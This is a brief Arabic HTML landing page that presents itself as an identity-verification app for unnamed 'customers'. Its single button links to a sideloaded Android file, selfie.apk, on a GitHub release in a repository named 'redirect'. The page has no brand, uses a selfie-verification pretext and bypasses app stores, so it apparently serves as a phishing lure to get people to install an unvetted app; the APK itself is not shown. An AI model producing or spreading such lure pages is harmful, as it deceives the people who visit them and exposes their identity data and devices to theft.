<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل تطبيق التحقق</title>
    <style>
        /* Light mint background */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #f0fdf4;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }

        /* The Card */
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.15);
            text-align: center;
            width: 90%;
            max-width: 420px;
            box-sizing: border-box;
        }

        /* Verification App Icon */
        .app-icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, #22c55e, #15803d);
            border-radius: 22px;
            margin: 0 auto 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.3);
        }

        .app-icon svg {
            width: 48px;
            height: 48px;
            fill: currentColor;
        }

        /* Typography */
        h1 {
            margin: 0 0 12px;
            font-size: 24px;
            color: #166534;
        }

        /* App Metadata Badges (Size & Version) */
        .app-meta {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }

        .badge {
            background-color: #dcfce7;
            color: #15803d;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        p {
            margin: 0 0 30px;
            font-size: 15px;
            line-height: 1.6;
            color: #4b5563;
        }

        /* The Button */
        .download-btn {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            padding: 16px 24px;
            font-size: 20px;
            color: #ffffff;
            background: linear-gradient(135deg, #22c55e 0%, #15803d 100%);
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            box-shadow: 0 8px 24px rgba(34, 197, 94, 0.4);
            transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
            animation: breathe 3s ease-in-out infinite;
            width: 100%;
            box-sizing: border-box;
        }

        /* Desktop Hover */
        .download-btn:hover {
            background: linear-gradient(135deg, #16a34a 0%, #14532d 100%);
            transform: scale(1.03);
            animation: none;
        }

        /* Mobile Touch */
        .download-btn:active {
            transform: scale(0.95);
            box-shadow: 0 4px 10px rgba(21, 128, 61, 0.4);
        }

        .download-icon {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        /* Subtle Energy Animation */
        @keyframes breathe {
            0%, 100% { transform: scale(1); box-shadow: 0 8px 24px rgba(34, 197, 94, 0.4); }
            50% { transform: scale(1.02); box-shadow: 0 12px 30px rgba(34, 197, 94, 0.6); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="app-icon">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 11.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
            </svg>
        </div>

        <h1>تطبيق التحقق من الهوية</h1>

        <div class="app-meta">
            <span class="badge">الإصدار 3</span>
            <span class="badge">80 ميغابايت</span>
        </div>

        <p>هذا التطبيق مخصص حصرياً لعملائنا. يُرجى تحميل التطبيق لإتمام عملية التحقق الأمني من الهوية عبر التقاط صورة شخصية (سيلفي).</p>

        <a href="https://github.com/agencyope/redirect/releases/download/main/selfie.apk" class="download-btn">
            <svg class="download-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
            </svg>
            <span>تحميل التطبيق الآن</span>
        </a>
    </div>

</body>
</html>
